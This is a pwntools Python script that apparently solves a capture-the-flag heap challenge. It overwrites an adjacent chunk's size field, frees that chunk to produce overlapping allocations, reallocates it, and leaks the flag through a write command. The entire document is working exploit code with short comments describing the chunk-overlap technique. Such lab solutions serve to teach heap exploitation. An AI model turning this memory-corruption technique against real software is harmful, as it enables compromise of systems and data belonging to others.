from pwn import *

p = process("/challenge/overlapping-odyssey-easy")

print(p.clean())

p.sendline(b"malloc 0 16")
p.sendline(b"malloc 1 16")
p.sendline(b"malloc 2 16")
p.sendline(b"malloc 3 16")

print(p.clean())

p.sendline(b"safe_read 0")
p.sendline(b"\x00" * 16 + b"\x00" * 8 + p64(0x1d1)) # overwrote the allocated chunk's size to 0x1d1

print(p.clean())

p.sendline(b"free 1") # next malloc'd chunk will overlap with all other chunks upto +0x1d1

print(p.clean())

p.sendline(b"malloc 4 456")

print(p.clean())

p.sendline(b"read_flag")

print(p.clean())

p.sendline(b"safe_write 4")

print(p.clean())

p.close()
